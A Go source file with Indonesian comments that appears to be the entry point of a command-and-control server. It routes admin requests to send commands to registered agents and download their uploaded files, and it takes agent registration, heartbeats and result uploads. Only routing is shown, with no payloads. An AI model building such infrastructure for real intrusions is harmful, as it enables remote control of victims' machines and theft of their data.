package main

import (
	"c2/config"
	"c2/database"
	"c2/handlers/admin"
	"c2/handlers/agent"
	"c2/middleware"
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

func main() {
	// Load konfigurasi dari .env
	config.LoadEnv()

	// Setup database
	database.Setup()

	// Inisialisasi router utama
	r := mux.NewRouter()

	r.HandleFunc("/admin/register", admin.RegisterAdmin).Methods("POST")
	r.HandleFunc("/admin/login", admin.LoginAdmin).Methods("POST")

	// Admin routes
	adminRouter := r.PathPrefix("/admin").Subrouter()
	adminRouter.Use(middleware.ValidateJWT)
	adminRouter.HandleFunc("/agents", admin.GetAllAgentsHandler).Methods("GET")
	adminRouter.HandleFunc("/delete_agent/{agent_id}", admin.DeleteAgentHandler).Methods("DELETE")
	adminRouter.HandleFunc("/update_meta/{agent_id}", admin.UpdateTagsAndNotes).Methods("PATCH")
	adminRouter.HandleFunc("/command/{agent_id}/send", admin.SendCommand).Methods("POST")
	adminRouter.HandleFunc("/command/{agent_id}", admin.GetCommandsByAgent).Methods("GET")
	adminRouter.HandleFunc("/command/{command_id}/download", admin.DownloadFile).Methods("GET")
	adminRouter.HandleFunc("/admin/command/{id}", admin.DeleteCommand).Methods("DELETE")

	// Agent routes (tanpa JWT)
	r.HandleFunc("/agent/register", agent.RegisterAgent).Methods("POST")
	r.HandleFunc("/agent/result", agent.SubmitResult).Methods("POST")

	// Agent routes (dengan JWT)
	authAgentRouter := r.PathPrefix("/agent").Subrouter()
	authAgentRouter.Use(middleware.ValidateJWT)
	authAgentRouter.HandleFunc("/heartbeat", agent.Heartbeat).Methods("POST")
	authAgentRouter.HandleFunc("/upload", agent.UploadResult).Methods("POST")

	// Bungkus semua route dengan middleware CORS
	handlerWithCORS := middleware.EnableCORS(r)

	// Jalankan server
	serverAddr := ":8080"
	log.Println("[*] Server started on", serverAddr)
	err := http.ListenAndServe(serverAddr, handlerWithCORS)
	if err != nil {
		log.Fatalf("[!] Error starting server: %v", err)
	}
}
